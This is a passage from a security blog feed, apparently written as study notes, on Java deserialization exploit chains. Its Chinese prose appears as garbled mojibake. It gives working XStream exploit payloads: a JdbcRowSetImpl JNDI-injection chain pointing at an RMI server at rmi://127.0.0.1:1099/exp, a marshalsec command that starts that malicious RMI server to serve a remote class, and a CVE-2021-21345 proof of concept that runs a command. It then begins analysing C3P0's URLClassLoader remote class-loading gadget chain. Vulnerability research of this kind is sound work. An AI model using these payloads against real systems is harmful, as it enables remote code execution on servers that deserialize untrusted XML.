class="hljs-attr">class</span>=<span class="hljs-string">&#x27;com.sun.xml.internal.bind.v2.runtime.JAXBContextImpl$1&#x27;</span>&gt;</span><br>                                                <span class="hljs-tag">&lt;<span class="hljs-name">outer-class</span> <span class="hljs-attr">reference</span>=<span class="hljs-string">&#x27;../..&#x27;</span>/&gt;</span><br>                                            <span class="hljs-tag">&lt;/<span class="hljs-name">marshallerPool</span>&gt;</span><br>                                            <span class="hljs-tag">&lt;<span class="hljs-name">nameList</span>&gt;</span><br>                                                <span class="hljs-tag">&lt;<span class="hljs-name">nsUriCannotBeDefaulted</span>&gt;</span><br>                                                    <span class="hljs-tag">&lt;<span class="hljs-name">boolean</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">boolean</span>&gt;</span><br>                                                <span class="hljs-tag">&lt;/<span class="hljs-name">nsUriCannotBeDefaulted</span>&gt;</span><br>                                                <span class="hljs-tag">&lt;<span class="hljs-name">namespaceURIs</span>&gt;</span><br>                                                    <span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>1<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span><br>                                                <span class="hljs-tag">&lt;/<span class="hljs-name">namespaceURIs</span>&gt;</span><br>                                                <span class="hljs-tag">&lt;<span class="hljs-name">localNames</span>&gt;</span><br>                                                    <span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>UTF-8<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span><br>                                                <span class="hljs-tag">&lt;/<span class="hljs-name">localNames</span>&gt;</span><br>                                            <span class="hljs-tag">&lt;/<span class="hljs-name">nameList</span>&gt;</span><br>                                        <span class="hljs-tag">&lt;/<span class="hljs-name">context</span>&gt;</span><br>                                    <span class="hljs-tag">&lt;/<span class="hljs-name">bridge</span>&gt;</span><br>                                <span class="hljs-tag">&lt;/<span class="hljs-name">bridge</span>&gt;</span><br>                                <span class="hljs-tag">&lt;<span class="hljs-name">jaxbObject</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&#x27;com.sun.rowset.JdbcRowSetImpl&#x27;</span> <span class="hljs-attr">serialization</span>=<span class="hljs-string">&#x27;custom&#x27;</span>&gt;</span><br>                                    <span class="hljs-tag">&lt;<span class="hljs-name">javax.sql.rowset.BaseRowSet</span>&gt;</span><br>                                        <span class="hljs-tag">&lt;<span class="hljs-name">default</span>&gt;</span><br>                                            <span class="hljs-tag">&lt;<span class="hljs-name">concurrency</span>&gt;</span>1008<span class="hljs-tag">&lt;/<span class="hljs-name">concurrency</span>&gt;</span><br>                                            <span class="hljs-tag">&lt;<span class="hljs-name">escapeProcessing</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">escapeProcessing</span>&gt;</span><br>                                            <span class="hljs-tag">&lt;<span class="hljs-name">fetchDir</span>&gt;</span>1000<span class="hljs-tag">&lt;/<span class="hljs-name">fetchDir</span>&gt;</span><br>                                            <span class="hljs-tag">&lt;<span class="hljs-name">fetchSize</span>&gt;</span>0<span class="hljs-tag">&lt;/<span class="hljs-name">fetchSize</span>&gt;</span><br>                                            <span class="hljs-tag">&lt;<span class="hljs-name">isolation</span>&gt;</span>2<span class="hljs-tag">&lt;/<span class="hljs-name">isolation</span>&gt;</span><br>                                            <span class="hljs-tag">&lt;<span class="hljs-name">maxFieldSize</span>&gt;</span>0<span class="hljs-tag">&lt;/<span class="hljs-name">maxFieldSize</span>&gt;</span><br>                                            <span class="hljs-tag">&lt;<span class="hljs-name">maxRows</span>&gt;</span>0<span class="hljs-tag">&lt;/<span class="hljs-name">maxRows</span>&gt;</span><br>                                            <span class="hljs-tag">&lt;<span class="hljs-name">queryTimeout</span>&gt;</span>0<span class="hljs-tag">&lt;/<span class="hljs-name">queryTimeout</span>&gt;</span><br>                                            <span class="hljs-tag">&lt;<span class="hljs-name">readOnly</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">readOnly</span>&gt;</span><br>                                            <span class="hljs-tag">&lt;<span class="hljs-name">rowSetType</span>&gt;</span>1004<span class="hljs-tag">&lt;/<span class="hljs-name">rowSetType</span>&gt;</span><br>                                            <span class="hljs-tag">&lt;<span class="hljs-name">showDeleted</span>&gt;</span>false<span class="hljs-tag">&lt;/<span class="hljs-name">showDeleted</span>&gt;</span><br>                                            <span class="hljs-tag">&lt;<span class="hljs-name">dataSource</span>&gt;</span>rmi://127.0.0.1:1099/exp<span class="hljs-tag">&lt;/<span class="hljs-name">dataSource</span>&gt;</span><br>                                            <span class="hljs-tag">&lt;<span class="hljs-name">params</span>/&gt;</span><br>                                        <span class="hljs-tag">&lt;/<span class="hljs-name">default</span>&gt;</span><br>                                    <span class="hljs-tag">&lt;/<span class="hljs-name">javax.sql.rowset.BaseRowSet</span>&gt;</span><br>                                    <span class="hljs-tag">&lt;<span class="hljs-name">com.sun.rowset.JdbcRowSetImpl</span>&gt;</span><br>                                        <span class="hljs-tag">&lt;<span class="hljs-name">default</span>&gt;</span><br>                                            <span class="hljs-tag">&lt;<span class="hljs-name">iMatchColumns</span>&gt;</span><br>                                                <span class="hljs-tag">&lt;<span class="hljs-name">int</span>&gt;</span>-1<span class="hljs-tag">&lt;/<span class="hljs-name">int</span>&gt;</span><br>                                                <span class="hljs-tag">&lt;<span class="hljs-name">int</span>&gt;</span>-1<span class="hljs-tag">&lt;/<span class="hljs-name">int</span>&gt;</span><br>                                                <span class="hljs-tag">&lt;<span class="hljs-name">int</span>&gt;</span>-1<span class="hljs-tag">&lt;/<span class="hljs-name">int</span>&gt;</span><br>                                                <span class="hljs-tag">&lt;<span class="hljs-name">int</span>&gt;</span>-1<span class="hljs-tag">&lt;/<span class="hljs-name">int</span>&gt;</span><br>                                                <span class="hljs-tag">&lt;<span class="hljs-name">int</span>&gt;</span>-1<span class="hljs-tag">&lt;/<span class="hljs-name">int</span>&gt;</span><br>                                                <span class="hljs-tag">&lt;<span class="hljs-name">int</span>&gt;</span>-1<span class="hljs-tag">&lt;/<span class="hljs-name">int</span>&gt;</span><br>                                                <span class="hljs-tag">&lt;<span class="hljs-name">int</span>&gt;</span>-1<span class="hljs-tag">&lt;/<span class="hljs-name">int</span>&gt;</span><br>                                                <span class="hljs-tag">&lt;<span class="hljs-name">int</span>&gt;</span>-1<span class="hljs-tag">&lt;/<span class="hljs-name">int</span>&gt;</span><br>                                                <span class="hljs-tag">&lt;<span class="hljs-name">int</span>&gt;</span>-1<span class="hljs-tag">&lt;/<span class="hljs-name">int</span>&gt;</span><br>                                                <span class="hljs-tag">&lt;<span class="hljs-name">int</span>&gt;</span>-1<span class="hljs-tag">&lt;/<span class="hljs-name">int</span>&gt;</span><br>                                            <span class="hljs-tag">&lt;/<span class="hljs-name">iMatchColumns</span>&gt;</span><br>                                            <span class="hljs-tag">&lt;<span class="hljs-name">strMatchColumns</span>&gt;</span><br>                                                <span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>foo<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span><br>                                                <span class="hljs-tag">&lt;<span class="hljs-name">null</span>/&gt;</span><br>                                                <span class="hljs-tag">&lt;<span class="hljs-name">null</span>/&gt;</span><br>                                                <span class="hljs-tag">&lt;<span class="hljs-name">null</span>/&gt;</span><br>                                                <span class="hljs-tag">&lt;<span class="hljs-name">null</span>/&gt;</span><br>                                                <span class="hljs-tag">&lt;<span class="hljs-name">null</span>/&gt;</span><br>                                                <span class="hljs-tag">&lt;<span class="hljs-name">null</span>/&gt;</span><br>                                                <span class="hljs-tag">&lt;<span class="hljs-name">null</span>/&gt;</span><br>                                                <span class="hljs-tag">&lt;<span class="hljs-name">null</span>/&gt;</span><br>                                                <span class="hljs-tag">&lt;<span class="hljs-name">null</span>/&gt;</span><br>                                            <span class="hljs-tag">&lt;/<span class="hljs-name">strMatchColumns</span>&gt;</span><br>                                        <span class="hljs-tag">&lt;/<span class="hljs-name">default</span>&gt;</span><br>                                    <span class="hljs-tag">&lt;/<span class="hljs-name">com.sun.rowset.JdbcRowSetImpl</span>&gt;</span><br>                                <span class="hljs-tag">&lt;/<span class="hljs-name">jaxbObject</span>&gt;</span><br>                            <span class="hljs-tag">&lt;/<span class="hljs-name">dataSource</span>&gt;</span><br>                        <span class="hljs-tag">&lt;/<span class="hljs-name">message</span>&gt;</span><br>                        <span class="hljs-tag">&lt;<span class="hljs-name">satellites</span>/&gt;</span><br>                        <span class="hljs-tag">&lt;<span class="hljs-name">invocationProperties</span>/&gt;</span><br>                    <span class="hljs-tag">&lt;/<span class="hljs-name">packet</span>&gt;</span><br>                <span class="hljs-tag">&lt;/<span class="hljs-name">indexMap</span>&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">comparator</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">default</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">int</span>&gt;</span>3<span class="hljs-tag">&lt;/<span class="hljs-name">int</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>javax.xml.ws.binding.attachments.inbound<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>javax.xml.ws.binding.attachments.inbound<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">java.util.PriorityQueue</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">java.util.PriorityQueue</span>&gt;</span><br></code></pre></td></tr></table></figure><p>è¿™é‡Œæ‰“çš„æ˜¯jndiæ³¨å…¥</p><p>é‚£æˆ‘ä»¬å°±éœ€è¦èµ·ä¸€ä¸ªæ¶æ„çš„rmiæœåŠ¡ï¼Œè¿™é‡Œç”¨marshalsecæ¥èµ·æœåŠ¡</p><figure class="highlight cmd"><table><tr><td class="code"><pre><code class="hljs cmd">java -cp marshalsec-<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">3</span>-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer http://<span class="hljs-number">127</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">1</span>:<span class="hljs-number">8888</span>/#exp<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/image-20241106152810804.png" alt="image-20241106152810804"></p><p>webæœåŠ¡ä¸‹æœ‰ä¸€ä¸ªè®¡ç®—å™¨çš„exp.class</p><p><img src="https://cdn.clown2024.cn/image-20241106153040392.png" alt="image-20241106153040392"></p><h2 id="cve-2021-21345è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´"><a href="#CVE-2021-21345è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´" class="headerlink" title="CVE-2021-21345è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´"></a>CVE-2021-21345è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´</h2><p>å½±å“ç‰ˆæœ¬&lt;&#x3D;1.4.15</p><p>poc</p><figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">java.util.PriorityQueue</span> <span class="hljs-attr">serialization</span>=<span class="hljs-string">&#x27;custom&#x27;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">unserializable-parents</span>/&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">java.util.PriorityQueue</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">default</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">size</span>&gt;</span>2<span class="hljs-tag">&lt;/<span class="hljs-name">size</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">comparator</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&#x27;sun.awt.datatransfer.DataTransferer$IndexOrderComparator&#x27;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">indexMap</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&#x27;com.sun.xml.internal.ws.client.ResponseContext&#x27;</span>&gt;</span><br>          <span class="hljs-tag">&lt;<span class="hljs-name">packet</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">message</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&#x27;com.sun.xml.internal.ws.encoding.xml.XMLMessage$XMLMultiPart&#x27;</span>&gt;</span><br>              <span class="hljs-tag">&lt;<span class="hljs-name">dataSource</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&#x27;com.sun.xml.internal.ws.message.JAXBAttachment&#x27;</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">bridge</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&#x27;com.sun.xml.internal.ws.db.glassfish.BridgeWrapper&#x27;</span>&gt;</span><br>                  <span class="hljs-tag">&lt;<span class="hljs-name">bridge</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&#x27;com.sun.xml.internal.bind.v2.runtime.BridgeImpl&#x27;</span>&gt;</span><br>                    <span class="hljs-tag">&lt;<span class="hljs-name">bi</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&#x27;com.sun.xml.internal.bind.v2.runtime.ClassBeanInfoImpl&#x27;</span>&gt;</span><br>                      <span class="hljs-tag">&lt;<span class="hljs-name">jaxbType</span>&gt;</span>com.sun.corba.se.impl.activation.ServerTableEntry<span class="hljs-tag">&lt;/<span class="hljs-name">jaxbType</span>&gt;</span><br>                      <span class="hljs-tag">&lt;<span class="hljs-name">uriProperties</span>/&gt;</span><br>                      <span class="hljs-tag">&lt;<span class="hljs-name">attributeProperties</span>/&gt;</span><br>                      <span class="hljs-tag">&lt;<span class="hljs-name">inheritedAttWildcard</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&#x27;com.sun.xml.internal.bind.v2.runtime.reflect.Accessor$GetterSetterReflection&#x27;</span>&gt;</span><br>                        <span class="hljs-tag">&lt;<span class="hljs-name">getter</span>&gt;</span><br>                          <span class="hljs-tag">&lt;<span class="hljs-name">class</span>&gt;</span>com.sun.corba.se.impl.activation.ServerTableEntry<span class="hljs-tag">&lt;/<span class="hljs-name">class</span>&gt;</span><br>                          <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>verify<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span><br>                          <span class="hljs-tag">&lt;<span class="hljs-name">parameter-types</span>/&gt;</span><br>                        <span class="hljs-tag">&lt;/<span class="hljs-name">getter</span>&gt;</span><br>                      <span class="hljs-tag">&lt;/<span class="hljs-name">inheritedAttWildcard</span>&gt;</span><br>                    <span class="hljs-tag">&lt;/<span class="hljs-name">bi</span>&gt;</span><br>                    <span class="hljs-tag">&lt;<span class="hljs-name">tagName</span>/&gt;</span><br>                    <span class="hljs-tag">&lt;<span class="hljs-name">context</span>&gt;</span><br>                      <span class="hljs-tag">&lt;<span class="hljs-name">marshallerPool</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&#x27;com.sun.xml.internal.bind.v2.runtime.JAXBContextImpl$1&#x27;</span>&gt;</span><br>                        <span class="hljs-tag">&lt;<span class="hljs-name">outer-class</span> <span class="hljs-attr">reference</span>=<span class="hljs-string">&#x27;../..&#x27;</span>/&gt;</span><br>                      <span class="hljs-tag">&lt;/<span class="hljs-name">marshallerPool</span>&gt;</span><br>                      <span class="hljs-tag">&lt;<span class="hljs-name">nameList</span>&gt;</span><br>                        <span class="hljs-tag">&lt;<span class="hljs-name">nsUriCannotBeDefaulted</span>&gt;</span><br>                          <span class="hljs-tag">&lt;<span class="hljs-name">boolean</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">boolean</span>&gt;</span><br>                        <span class="hljs-tag">&lt;/<span class="hljs-name">nsUriCannotBeDefaulted</span>&gt;</span><br>                        <span class="hljs-tag">&lt;<span class="hljs-name">namespaceURIs</span>&gt;</span><br>                          <span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>1<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span><br>                        <span class="hljs-tag">&lt;/<span class="hljs-name">namespaceURIs</span>&gt;</span><br>                        <span class="hljs-tag">&lt;<span class="hljs-name">localNames</span>&gt;</span><br>                          <span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>UTF-8<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span><br>                        <span class="hljs-tag">&lt;/<span class="hljs-name">localNames</span>&gt;</span><br>                      <span class="hljs-tag">&lt;/<span class="hljs-name">nameList</span>&gt;</span><br>                    <span class="hljs-tag">&lt;/<span class="hljs-name">context</span>&gt;</span><br>                  <span class="hljs-tag">&lt;/<span class="hljs-name">bridge</span>&gt;</span><br>                <span class="hljs-tag">&lt;/<span class="hljs-name">bridge</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">jaxbObject</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&#x27;com.sun.corba.se.impl.activation.ServerTableEntry&#x27;</span>&gt;</span><br>                  <span class="hljs-tag">&lt;<span class="hljs-name">activationCmd</span>&gt;</span>calc<span class="hljs-tag">&lt;/<span class="hljs-name">activationCmd</span>&gt;</span><br>                <span class="hljs-tag">&lt;/<span class="hljs-name">jaxbObject</span>&gt;</span><br>              <span class="hljs-tag">&lt;/<span class="hljs-name">dataSource</span>&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">message</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">satellites</span>/&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">invocationProperties</span>/&gt;</span><br>          <span class="hljs-tag">&lt;/<span class="hljs-name">packet</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">indexMap</span>&gt;</span><br>      <span class="hljs-tag">&lt;/<span class="hljs-name">comparator</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">default</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">int</span>&gt;</span>3<span class="hljs-tag">&lt;/<span class="hljs-name">int</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>javax.xml.ws.binding.attachments.inbound<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>javax.xml.ws.binding.attachments.inbound<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">java.util.PriorityQueue</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">java.util.PriorityQueue</span>&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/image-20241106153336587.png" alt="image-20241106153336587"></p><h1 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h1><p><a href="https://y4tacker.github.io/2022/02/10/year/2022/2/XStream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96">https://y4tacker.github.io/2022/02/10/year/2022/2/XStream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96</a></p><p><a href="https://xz.aliyun.com/t/11372?u_atoken=d255e03184aefd4a575a1a82fa1faa70&u_asig=1a0c399d17307034326662515e00b6&time__1311=n4+xyie7wxg0GODlxGrzGWwxYqGKG8AlD0O+iD">https://xz.aliyun.com/t/11372?u_atoken=d255e03184aefd4a575a1a82fa1faa70&amp;u_asig=1a0c399d17307034326662515e00b6&amp;time__1311=n4%2Bxyie7wxg0GODlxGrzGWwxYqGKG8AlD0O%2BiD</a></p><p>åé¢ç‰ˆæœ¬çš„ä¿®å¤éƒ½æ˜¯é»‘ç™½åå•çš„å½¢å¼æ¥ä¿®å¤ï¼Œè¿™ç¯‡æ–‡ç« æ€»ç»“çš„æ›´åŠ è¯¦ç»†ï¼š<a href="https://tttang.com/archive/1699/">https://tttang.com/archive/1699/</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;xstreamä»‹ç»&quot;&gt;&lt;a href=&quot;#XStreamä»‹ç»&quot; class=&quot;headerlink&quot; title=&quot;XStreamä»‹ç»&quot;&gt;&lt;/a&gt;XStreamä»‹ç»&lt;/h1&gt;&lt;p&gt;XStreamæ˜¯ä¸€ä¸ªç®€å•çš„åŸºäºJavaåº“ï¼Œèƒ½å¤Ÿå°†Javaå¯¹è±¡å’Œxmlæ–‡æ¡£ä¹‹é—´è¿›è¡Œç›¸äº’</summary>
      
    
    
    
    <category term="java" scheme="https://clowsman.github.io/categories/java/"/>
    
    
    <category term="java" scheme="https://clowsman.github.io/tags/java/"/>
    
  </entry>
  
  <entry>
    <title>C3P0åˆ©ç”¨é“¾å­¦ä¹ </title>
    <link href="https://clowsman.github.io/2024/11/01/C3P0%E5%88%A9%E7%94%A8%E9%93%BE%E5%AD%A6%E4%B9%A0/"/>
    <id>https://clowsman.github.io/2024/11/01/C3P0%E5%88%A9%E7%94%A8%E9%93%BE%E5%AD%A6%E4%B9%A0/</id>
    <published>2024-11-01T04:34:42.000Z</published>
    <updated>2024-12-03T13:09:21.916Z</updated>
    
    <content type="html"><![CDATA[<h1 id="c3p0ä»‹ç»"><a href="#C3P0ä»‹ç»" class="headerlink" title="C3P0ä»‹ç»"></a>C3P0ä»‹ç»</h1><p>C3P0æ˜¯ä¸€ä¸ªå¼€æºçš„JDBCè¿æ¥æ± ï¼Œå®ƒå®ç°äº†æ•°æ®æºå’ŒJNDIç»‘å®šï¼Œæ”¯æŒJDBC3è§„èŒƒå’ŒJDBC2çš„æ ‡å‡†æ‰©å±•ã€‚ç›®å‰ä½¿ç”¨å®ƒçš„å¼€æºé¡¹ç›®æœ‰Hibernateï¼ŒSpringç­‰ã€‚</p><p>JDBCæ˜¯Java DataBase Connectivityçš„ç¼©å†™ï¼Œå®ƒæ˜¯Javaç¨‹åºè®¿é—®æ•°æ®åº“çš„æ ‡å‡†æ¥å£ã€‚<br>ä½¿ç”¨Javaç¨‹åºè®¿é—®æ•°æ®åº“æ—¶ï¼ŒJavaä»£ç å¹¶ä¸æ˜¯ç›´æ¥é€šè¿‡TCPè¿æ¥å»è®¿é—®æ•°æ®åº“ï¼Œè€Œæ˜¯é€šè¿‡JDBCæ¥å£æ¥è®¿é—®ï¼Œè€ŒJDBCæ¥å£åˆ™é€šè¿‡JDBCé©±åŠ¨æ¥å®ç°çœŸæ­£å¯¹æ•°æ®åº“çš„è®¿é—®ã€‚</p><p>è¿æ¥æ± ç±»ä¼¼äºçº¿ç¨‹æ± ï¼Œåœ¨ä¸€äº›æƒ…å†µä¸‹æˆ‘ä»¬ä¼šé¢‘ç¹åœ°æ“ä½œæ•°æ®åº“ï¼Œæ­¤æ—¶Javaåœ¨è¿æ¥æ•°æ®åº“æ—¶ä¼šé¢‘ç¹åœ°åˆ›å»ºæˆ–é”€æ¯å¥æŸ„ï¼Œå¢å¤§èµ„æºçš„æ¶ˆè€—ã€‚ä¸ºäº†é¿å…è¿™æ ·ä¸€ç§æƒ…å†µï¼Œæˆ‘ä»¬å¯ä»¥æå‰åˆ›å»ºå¥½ä¸€äº›è¿æ¥å¥æŸ„ï¼Œéœ€è¦ä½¿ç”¨æ—¶ç›´æ¥ä½¿ç”¨å¥æŸ„ï¼Œä¸éœ€è¦æ—¶å¯å°†å…¶æ”¾å›è¿æ¥æ± ä¸­ï¼Œå‡†å¤‡ä¸‹ä¸€æ¬¡çš„ä½¿ç”¨ã€‚ç±»ä¼¼è¿™æ ·ä¸€ç§èƒ½å¤Ÿå¤ç”¨å¥æŸ„çš„æŠ€æœ¯å°±æ˜¯æ± æŠ€æœ¯ã€‚</p><h1 id="ç¯å¢ƒæ­å»º"><a href="#ç¯å¢ƒæ­å»º" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h1><figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!-- https://mvnrepository.com/artifact/com.mchange/c3p0 --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.mchange<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>c3p0<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>0.9.5.2<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><h1 id="åˆ©ç”¨æ–¹å¼"><a href="#åˆ©ç”¨æ–¹å¼" class="headerlink" title="åˆ©ç”¨æ–¹å¼"></a>åˆ©ç”¨æ–¹å¼</h1><p>C3P0çš„å¸¸è§åˆ©ç”¨æ–¹å¼æœ‰ä¸‰ç§ï¼š</p><ul><li>URLClassLoaderè¿œç¨‹ç±»åŠ è½½</li><li>JNDIæ³¨å…¥</li><li>åˆ©ç”¨HEXåºåˆ—åŒ–å­—èŠ‚åŠ è½½å™¨è¿›è¡Œååºåˆ—åŒ–æ”»å‡»</li></ul><h2 id="urlclassloaderè¿œç¨‹ç±»åŠ è½½"><a href="#URLClassLoaderè¿œç¨‹ç±»åŠ è½½" class="headerlink" title="URLClassLoaderè¿œç¨‹ç±»åŠ è½½"></a>URLClassLoaderè¿œç¨‹ç±»åŠ è½½</h2><p>è°ƒç”¨é“¾</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">PoolBackedDataSourceBase#readObject -&gt;<br>ReferenceSerialized#getObject -&gt;<br>ReferenceableUtils#referenceToObject -&gt;<br>ObjectFactory#getObjectInstance<br></code></pre></td></tr></table></figure><h3 id="æµç¨‹åˆ†æ"><a href="#æµç¨‹åˆ†æ" class="headerlink" title="æµç¨‹åˆ†æ"></a>æµç¨‹åˆ†æ</h3><p>é¦–å…ˆæ¥çœ‹PoolBackedDataSourceBase#readObjectæ–¹æ³•</p><p><img src="https://cdn.clown2024.cn/image-20241101134337171.png" alt="image-20241101134337171"></p><p>æ¼æ´çš„è§¦å‘å…¥å£å°±åœ¨è¿™ï¼Œå¦‚æœååºåˆ—åŒ–å¾—åˆ°çš„Objectä¸ºIndirectlySerializedï¼Œå°±ä¼šè°ƒç”¨å…¶getObjectæ–¹æ³•</p><p>IndirectlySerializedæ˜¯ä¸€ä¸ªæ¥å£ï¼Œä»–çš„å®ç°ç±»å°±æ˜¯ReferenceSerializedï¼Œé‚£æ¥ä¸‹æ¥å»çœ‹çœ‹ä»–çš„getObjectæ–¹æ³•</p><p><img src="https://cdn.clown2024.cn/image-20241101135245450.png" alt="image-20241101135245450"></p><p>ReferenceSerializedç±»æ˜¯ReferenceIndirectorçš„ä¸€ä¸ªå†…éƒ¨ç±»ï¼Œè€Œä¸”å¯ä»¥çœ‹åˆ°è¿™é‡Œå…¶å®å·²ç»å‡ºç°äº†initialContext.lookupæ–¹æ³•ï¼Œä½†æ˜¯æˆ‘ä»¬åœ¨ååºåˆ—åŒ–çš„æ—¶å€™å…¶å®æ˜¯æ— æ³•è°ƒç”¨è¯¥æ–¹æ³•çš„ï¼Œå› ä¸ºcontextNameé»˜è®¤ä¸ºnullä¸”ä¸å¯æ§</p><p>é‚£ç»§ç»­å¾€ä¸‹çœ‹ReferenceableUtils#referenceToObjectæ–¹æ³•</p><p><img src="https://cdn.clown2024.cn/image-20241101135741940.png" alt="image-20241101135741940"></p><p>å¯ä»¥çœ‹åˆ°è¿™é‡Œå°±åˆ©ç”¨äº†URLClassLoaderæ¥è¿›è¡Œè¿œç¨‹ç±»åŠ è½½ï¼Œåªéœ€è¦æˆ‘ä»¬è®¾ç½®è¿œç¨‹å·¥å‚ç±»åœ°å€<code>fClassLocation</code></p><p>é‚£ç°åœ¨è¿˜æœ‰ä¸€ä¸ªé—®é¢˜ï¼Œæˆ‘ä»¬è¦å¦‚ä½•æ„é€ ReferenceSerializedè¿™ä¸ªç±»å‘¢ï¼Œè¿™ä¸ªç±»ä»ä¸Šé¢æˆ‘ä»¬å¯ä»¥çŸ¥é“æ˜¯ä¸€ä¸ªç§æœ‰çš„ç±»ï¼Œæˆ‘ä»¬æ— æ³•ç›´æ¥è·å–ï¼Œé‚£å°±çœ‹ä¸€ä¸‹æœ‰è°è°ƒç”¨äº†ä»–çš„æ„é€ æ–¹æ³•</p><p><img src="https://cdn.clown2024.cn/image-20241101185304051.png" alt="image-20241101185304051"></p><p>å¯ä»¥å‘ç°åœ¨å¤–éƒ¨ç±»ReferenceIndirector#indirectFormæ–¹æ³•é‡Œé¢è¿›è¡Œäº†è°ƒç”¨</p><p><img src="https://cdn.clown2024.cn/image-20241101185405398.png" alt="image-20241101185405398"></p><p>ä½†æ˜¯è¿™ä¸ªæ–¹æ³•æˆ‘ä»¬ä¸æ–¹ä¾¿è°ƒç”¨ï¼Œæ‰€ä»¥ç»§ç»­å¾€ä¸Šæ‰¾ï¼Œå‘ç°åœ¨PoolBackedDataSourceBase#writeObjectæ–¹æ³•é‡Œé¢è¿›è¡Œäº†è°ƒç”¨ï¼Œæ‰€ä»¥æˆ‘ä»¬åœ¨æ­£å¸¸åºåˆ—åŒ–çš„æµç¨‹ä¸­å°±å¯ä»¥å®Œæˆè¿™ä¸ªæ“ä½œ</p><p><img src="https://cdn.clown2024.cn/image-20241101190429527.png" 